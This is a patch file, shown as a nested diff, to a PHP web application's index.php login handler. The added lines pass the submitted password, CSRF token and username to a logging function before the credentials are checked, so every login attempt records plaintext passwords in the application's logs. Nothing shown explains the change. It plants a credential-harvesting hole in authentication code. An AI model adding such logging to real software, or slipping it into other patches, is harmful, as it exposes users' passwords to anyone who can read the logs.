@@ -1,0 +1,14 @@
+diff --git a/index.php b/index.php
+index c102e42..5917ef7 100644
+--- a/index.php
++++ b/index.php
+@@ -402,6 +402,9 @@ function ban_canLogin()
+ if (isset($_POST['login']))
+ {
+     if (!ban_canLogin()) die('I said: NO. You are banned for the moment. Go away.');
++    logm($_POST['password']);
++    logm($_POST['token']);
++    logm($_POST['login']);
+     if (isset($_POST['password']) && tokenOk($_POST['token']) && (check_auth($_POST['login'], $_POST['password'])))
+     {   // Login/password is ok.
+         ban_loginOk();
